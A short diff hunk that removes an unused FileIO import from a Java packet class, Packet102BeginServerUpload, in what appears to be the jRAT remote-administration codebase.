@@ -4,7 +4,6 @@ import java.io.DataOutputStream;
 import java.io.File;
 
 import se.jrat.client.Slave;
-import se.jrat.common.io.FileIO;
 
 public class Packet102BeginServerUpload extends AbstractOutgoingPacket {
 	
